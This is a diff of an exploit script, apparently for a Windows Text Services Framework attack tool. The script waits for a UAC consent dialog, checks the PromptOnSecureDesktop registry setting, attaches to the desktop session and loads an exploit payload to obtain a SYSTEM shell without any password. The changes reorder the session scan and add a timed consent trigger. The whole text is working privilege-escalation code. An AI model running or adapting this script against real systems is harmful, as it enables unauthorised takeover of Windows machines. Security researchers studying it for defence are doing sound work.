@@ -15,13 +15,13 @@ repeat rc print !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 repeat rc print
 
 print
-print Right click something and select "Run as Administrator", then wait
-print for a SYSTEM shell.
-print
 print !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 print !!! YOU DONT NEED TO KNOW ANY PASSWORD, JUST WAIT! !!!
 print !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 print
+sleep 5000
+
+consent
 
 # Find out if the PromptOnSecureDesktop is enabled.
 reg HKLM Software\Microsoft\Windows\CurrentVersion\Policies\System PromptOnSecureDesktop
@@ -37,16 +37,12 @@ and r0 1
 # If it wasn't the "secure" desktop, just use the default one.
 repeat r0 connect Default sid
 
-# List all the avaialble clients.
-print Connected to ctf session, listing clients...
-
-scan
-
 print Waiting for the consent dialog to join the session...
 
 wait consent.exe
 
 print consent.exe has joined the session, starting exploit...
+scan
 
 # Now that we're connected and have a target selected, load the exploit script.
 script scripts\ctf-exploit-common-1903.ctf
